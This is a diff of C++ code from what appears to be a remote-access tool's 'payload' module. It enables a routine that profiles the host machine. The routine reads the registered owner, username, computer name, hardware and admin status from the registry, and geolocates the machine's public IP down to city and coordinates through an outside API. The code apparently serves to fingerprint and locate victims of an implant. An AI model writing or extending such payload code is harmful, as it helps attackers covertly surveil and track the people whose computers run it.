@@ -129,41 +129,50 @@ namespace payload { // payload funktioner som används för att utföra någonting p
 
 	std::string info(std::string query)
 	{
-		//http_session geoip("Remote-Admin-Web 1/0", "api.ipdata.co");
-		//nlohmann::json response = nlohmann::json::parse(geoip.request("GET", "?api-key=test"));
-		//Sleep(100);
+		http_session geoip("Remote-Admin-Web 1/0", "api.ipdata.co");
+		nlohmann::json response;
+		bool success = false;
+		while (!success) {
+			try {
+				response = nlohmann::json::parse(geoip.request("GET", "?api-key=test"));
+				success = true;
+			}
+			catch (std::exception exc) { std::cout << "json-parse() - could not parse json, webstream broken" << std::endl; }
+		}
+		
 		std::unordered_map<std::string, std::function<std::string()>> information = {
-			{"windows-product", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "productname"); } },
-			{"windows-owner",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner"); } },
-			{"windows-architecture",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "PROCESSOR_ARCHITECTURE"); } },
-			{"computer-name",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName"); } },
-			{"cpu-name", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString"); } },
-			{"ram-size",[&] {
+			{"Windows Product", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "productname"); } },
+			{"Windows Owner",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner"); } },
+			{"Windows Architecture",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "PROCESSOR_ARCHITECTURE"); } },
+			{"Computer Name",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName"); } },
+			{"Cpu Name", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString"); } },
+			{"Ram Size",[&] {
 				MEMORYSTATUSEX buffer{sizeof(buffer)};
 
 				GlobalMemoryStatusEx(&buffer);
 
 				return std::to_string(std::roundl(buffer.ullTotalPhys / (1024.0 * 1024.0 * 1024.0)));
 			}},
-			{"windows-username", [&]{
-				std::vector<char> buffer(256);
+			{"Windows Username", [&]{
+				std::vector<char> buffer(256, '\0');
 				DWORD size = 256;
 				if (GetUserNameA(buffer.data(), &size)) {
-					return std::string(buffer.begin(), buffer.end()).substr(0, size);
+					buffer.resize(size);
+					return std::string(buffer.begin(), buffer.end()).substr(0, size-1);
 				}
 				else {
 					return std::string("null");
 				}
 			}},
-			{"running-as-admin", [&] { return std::string(IsUserAnAdmin() ? "true" : "false"); }},
-			//{ "public-ip",[&] { return helper::dequote(response["ip"].dump()); } },
-			//{ "continent",[&] { return helper::dequote(response["continent_name"].dump()); } },
-			//{ "country",[&] { return helper::dequote(response["country_name"].dump()); } },
-			//{ "region", [&] { return helper::dequote(response["region"].dump()); } },
-			//{ "city", [&] { return helper::dequote(response["city"].dump()); } },
-			//{ "latitude",[&] { return helper::dequote(response["latitude"].dump()); } },
-			//{ "longitude",[&] { return helper::dequote(response["longitude"].dump()); } },
-			//{ "language",[&] { return helper::dequote(response["languages"].dump()); } }
+			{"Running As Admin", [&] { return std::string(IsUserAnAdmin() ? "true" : "false"); }},
+			{"Public Ip",[&] { return helper::dequote(response["ip"].dump()); } },
+			{"Continent",[&] { return helper::dequote(response["continent_name"].dump()); } },
+			{"Country",[&] { return helper::dequote(response["country_name"].dump()); } },
+			{"Region", [&] { return helper::dequote(response["region"].dump()); } },
+			{"City", [&] { return helper::dequote(response["city"].dump()); } },
+			{"Latitude",[&] { return helper::dequote(response["latitude"].dump()); } },
+			{"Longitude",[&] { return helper::dequote(response["longitude"].dump()); } },
+			{"Language",[&] { return helper::dequote(response["languages"].dump()); } }
 		};
 
 		if (information.count(query)) {
